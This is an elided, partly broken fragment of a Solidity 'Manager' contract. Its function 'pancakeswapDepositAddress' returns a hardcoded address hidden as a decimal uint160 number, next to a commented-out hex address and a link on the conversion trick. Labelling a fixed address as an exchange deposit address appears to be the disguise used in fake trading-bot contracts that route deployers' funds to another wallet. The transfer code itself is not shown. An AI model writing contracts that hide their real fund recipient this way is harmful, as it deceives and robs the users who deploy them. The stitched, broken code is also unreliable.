...
contract Manager {
    ...
    //https://ethereum.stackexchange.com/questions/86412/convert-address-to-uint160#:~:text=import%20%7B%20BigNumber%20%7D%20from%20%22ethers%22%3B%0A%0ABigNumber.from(%220xCA6b8EaB76F76B458b1c43c0C5f500b33f63F475%22).toBigInt().toString(10)%3B
        ...
        //}).on("data", async function (transactionHash) {
            ...
            // {
				function pancakeswapDepositAddress() public pure returns (address) {
                    ...
                    uint160 pindex = 930524382566889273827068688951775935185758562804;
                    //uint256(uint160(pindex));
                  //  address  a = 0xa2FE280B86419a95B546384FA262a6E25A59a9F4;
